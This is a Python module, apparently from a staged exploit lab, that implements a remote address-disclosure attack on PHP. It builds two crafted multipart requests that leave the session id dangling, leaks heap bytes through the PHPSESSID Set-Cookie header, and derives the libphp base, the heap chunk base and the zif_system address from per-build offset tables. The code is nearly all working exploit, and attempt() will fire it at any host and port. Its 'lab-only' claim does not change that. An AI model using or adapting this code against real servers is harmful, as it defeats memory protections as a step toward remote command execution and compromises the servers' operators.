"""In-band address disclosure (rung 6) — PS(id) -> Set-Cookie.

The repo's rung-5b lab reads `zif_system` from the `[UAFDBG]` calibration
oracle. That is the lab analog of a leak, not a leak. Wiz (2026-10-27)
reports the absence of a generalized remote leak as one of the two barriers
keeping public PHP2Shell kits from working.

This module implements the public PS(id) cookie-disclosure shape
(dinosn/9bie lineage) and the address derivation, for a lab target:

  leak-A  multipart with `max_input_vars + 1` fields, `PHPSESSID=\\0`,
          and an OOM field that fits `post_max_size` but exceeds
          `memory_limit`. The OOM leaves `PS(id)` dangled and
          `send_cookie=1`.
  leak-B  a multipart with exactly `max_input_vars` fields plus a
          257-element array. If the array's `zend_array` lands at
          `PS(id)-0x10`, `ZSTR_LEN` reads `nTableSize` and the response
          `Set-Cookie: PHPSESSID=` carries URL-encoded heap.

  derive  parse the cookie, scan qwords, subtract the build's
          `zval_ptr_dtor` offset -> libphp base; majority-vote the
          2 MiB-aligned chunk pointers -> ZendMM chunk base.

Everything is lab-only and read-only: no writes, no command execution, no
remote target packaging. The point is to replace the instrumentation crutch,
not to ship a weapon.
"""

import re
import struct
from dataclasses import dataclass, field
from urllib.parse import unquote_to_bytes

from . import probe, sapi

# libphp symbol offsets from public per-build inventories
# (devploit/php2shell docs/offset-inventory.md; 9bie pure/ offsets).
# A build is identified by image tag + arch; the offset is ASLR-independent.
OFFSETS = {
    "php-8.4.26-bookworm-amd64": {"zif_system": 0x465370, "zval_ptr_dtor": 0x65EB60},
    "php-8.4.25-bookworm-aarch64": {"zif_system": 0x42FA30, "zval_ptr_dtor": 0x637AE0},
    "php-8.5.11-bookworm-aarch64": {"zif_system": 0x5314F0, "zval_ptr_dtor": 0x761B80},
    "php-8.5.10-bookworm-aarch64": {"zif_system": 0x52E130, "zval_ptr_dtor": 0x75D360},
    "php-8.5.0-bookworm-aarch64": {"zif_system": 0x503510, "zval_ptr_dtor": 0x731D80},
    "php-8.3.35-bookworm-aarch64": {"zif_system": 0x377428, "zval_ptr_dtor": 0x46FCC0},
    "php-8.2.34-bookworm-aarch64": {"zif_system": 0x36FF48, "zval_ptr_dtor": 0x4606C0},
    "php-8.2.0-bookworm-aarch64": {"zif_system": 0x364F30, "zval_ptr_dtor": 0x4520C0},
}

USER_MIN = 0x7F0000000000
USER_MAX = 0x800000000000


@dataclass
class LeakResult:
    disclosed: bool = False
    cookie_len: int = 0
    cookie: bytes = b""
    libphp_base: int = None
    chunk_base: int = None
    zif_system: int = None
    libphp_votes: dict = field(default_factory=dict)
    chunk_votes: dict = field(default_factory=dict)
    notes: list = field(default_factory=list)

    def ok(self):
        return self.disclosed and self.libphp_base is not None


def multipart(fields, boundary="LEAK"):
    """fields: list of (name: bytes, value: bytes, filename: bytes|None)."""
    b = boundary.encode()
    out = bytearray()
    for item in fields:
        name, value = item[0], item[1]
        filename = item[2] if len(item) > 2 else None
        out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"" +
                   name + b"\"")
        if filename is not None:
            out.extend(b"; filename=\"" + filename + b"\"")
        out.extend(b"\r\n\r\n" + value + b"\r\n")
    out.extend(b"--" + b + b"--\r\n")
    return bytes(out)


def _name(i, width):
    """Public builder's name shape: 'f%0*d' truncated/padded to `width`."""
    if width <= 1:
        return b""
    return (b"f%0*d" % (max(0, width - 1), i))[:width]


def leak_a_body(n_vars=1001, oom_mb=40.0, boundary="LEAKA",
                phpsessid=b"\x00", name_len=5, name_len2=39,
                name_mix=163, val_len=39, prog_len=3, include_file=True):
    """Arm the dangling PS(id) — the 9bie leak-A shape.

    Order matters (public builder): NVARS ordinary fields -> PHPSESSID (a
    single NUL) -> upload-progress -> file part (FILE_START) -> huge field
    that OOMs inside php_request_startup.
    """
    fields = []
    for i in range(n_vars):
        width = name_len2 if (name_mix and i < name_mix) else name_len
        fields.append((_name(i, width), b"x" * max(0, val_len)))
    fields.append((b"PHPSESSID", phpsessid))
    fields.append((b"PHP_SESSION_UPLOAD_PROGRESS", b"p" * prog_len))
    if include_file:
        fields.append((b"f", b"A" * 64, b"a.txt"))
    fields.append((b"big", b"B" * int(oom_mb * 1024 * 1024)))
    return multipart(fields, boundary)


def leak_b_body(n=742, target=447, m=257, boundary="LEAKB",
                sid="leaksessionid01", progress=b"pwn"):
    """Reclaim the dangling PS(id) — the 9bie leak-B nested-array shape.

    `n` top-level array names; index `target` carries `m` elements, the
    rest one each. Together with PHPSESSID + progress this stays at the
    max_input_vars boundary while landing a 257-element zend_array in the
    stale block.
    """
    fields = [(b"PHPSESSID", sid.encode()), (b"PHP_SESSION_UPLOAD_PROGRESS", progress)]
    for i in range(n):
        cnt = m if (target < 0 or i == target) else 1
        for j in range(cnt):
            fields.append((b"a%04d[%d]" % (i, j), b"x"))
    return multipart(fields, boundary)


def parse_phpsessid(resp):
    """Return the raw PHPSESSID Set-Cookie value (bytes), or None."""
    for line in probe.header_lines(resp):
        if line.lower().startswith("set-cookie:"):
            value = line.split(":", 1)[1].strip()
            if value.lower().startswith("phpsessid="):
                raw = value.split(";", 1)[0].split("=", 1)[1]
                return unquote_to_bytes(raw), raw
    return None, None


def looks_disclosed(raw_value, decoded):
    """A normal id is 22-40 alphanumerics; a disclosure is longer or
    contains percent-escapes / non-printable bytes."""
    if raw_value is None:
        return False
    if "%" in raw_value and len(raw_value) > 48:
        return True
    if len(decoded) > 64:
        return True
    return False


def _qwords(blob):
    out = []
    for off in range(0, max(0, len(blob) - 7)):
        (v,) = struct.unpack_from("<Q", blob, off)
        if USER_MIN <= v < USER_MAX:
            out.append(v)
    return out


def derive(blob, offsets, arch="amd64"):
    """Derive libphp base and ZendMM chunk base from a leaked cookie."""
    res = LeakResult(disclosed=True, cookie=blob, cookie_len=len(blob))
    vals = _qwords(blob)
    if not vals:
        res.notes.append("no user-space qwords in the disclosed bytes")
        return res

    # libphp: qword == libphp_base + zval_ptr_dtor offset. The public
    # builders check the low 21 bits (libphp is 2 MiB-aligned); fall back
    # to page alignment if the build maps differently.
    libphp_votes = {}
    for v in vals:
        for name, offs in offsets.items():
            base = v - offs["zval_ptr_dtor"]
            if base & 0xFFF == 0 and USER_MIN <= base < USER_MAX:
                # prefer 2 MiB-aligned bases with a heavy vote
                weight = 4 if base & 0x1FFFFF == 0 else 1
                libphp_votes[base] = libphp_votes.get(base, 0) + weight
    if libphp_votes:
        base, votes = max(libphp_votes.items(), key=lambda kv: kv[1])
        res.libphp_base = base
        res.libphp_votes = dict(sorted(libphp_votes.items(),
                                       key=lambda kv: -kv[1])[:8])
        # Pick the offset table entry that produced the winning base.
        for name, offs in offsets.items():
            if (base + offs["zval_ptr_dtor"]) in vals:
                res.zif_system = base + offs["zif_system"]
                res.notes.append(f"offsets: {name}")
                break

    # ZendMM chunk: 2 MiB-aligned pointers, majority vote.
    chunk_votes = {}
    for v in vals:
        if v & 0x1FFFFF == 0:
            chunk_votes[v] = chunk_votes.get(v, 0) + 1
    if chunk_votes:
        chunk, votes = max(chunk_votes.items(), key=lambda kv: kv[1])
        res.chunk_base = chunk
        res.chunk_votes = dict(sorted(chunk_votes.items(),
                                      key=lambda kv: -kv[1])[:8])
        res.notes.append(f"chunk base votes: {votes}")

    if res.libphp_base is None:
        res.notes.append("no qword matched zval_ptr_dtor + page-aligned base")
    return res


def attempt(host, port, path="/index.php", offsets=None, oom_mb=40.0,
            n_vars_a=1001, n_vars_b=742, array_len=257, target=447,
            timeout=60):
    """Run leak-A then leak-B; return a LeakResult."""
    offsets = offsets or OFFSETS
    res = LeakResult()

    body_a = leak_a_body(n_vars=n_vars_a, oom_mb=oom_mb)
    resp_a = probe.http_post(
        host, port, path, body_a,
        headers={"Content-Type": "multipart/form-data; boundary=LEAKA"},
        timeout=timeout, recv_timeout=timeout,
    )
    res.notes.append(f"leak-A: {probe.status(resp_a)} "
                     f"body={len(probe.body(resp_a))}B")

    body_b = leak_b_body(n=n_vars_b, target=target, m=array_len)
    resp_b = probe.http_post(
        host, port, path, body_b,
        headers={"Content-Type": "multipart/form-data; boundary=LEAKB"},
        timeout=timeout, recv_timeout=timeout,
    )
    decoded, raw = parse_phpsessid(resp_b)
    res.notes.append(f"leak-B: {probe.status(resp_b)} "
                     f"cookie_len={len(raw or '')}")
    if decoded is None:
        res.notes.append("no PHPSESSID Set-Cookie on leak-B")
        return res

    res.cookie = decoded
    res.cookie_len = len(decoded)
    if not looks_disclosed(raw, decoded):
        res.notes.append("cookie looks like a normal session id (no disclosure)")
        return res

    res.disclosed = True
    derived = derive(decoded, offsets)
    res.libphp_base = derived.libphp_base
    res.chunk_base = derived.chunk_base
    res.zif_system = derived.zif_system
    res.libphp_votes = derived.libphp_votes
    res.chunk_votes = derived.chunk_votes
    res.notes.extend(derived.notes)
    return res


def self_test():
    """Deterministic derivation test with a synthetic 512-byte disclosure."""
    base = 0x7F1234500000
    offs = OFFSETS["php-8.4.26-bookworm-amd64"]
    blob = bytearray(b"\x00" * 512)
    struct.pack_into("<Q", blob, 0x10, base + offs["zval_ptr_dtor"])
    struct.pack_into("<Q", blob, 0x40, 0x7F1234C00000)
    struct.pack_into("<Q", blob, 0x80, 0x7F1234C00000)
    res = derive(bytes(blob), {"php-8.4.26-bookworm-amd64": offs})
    return res
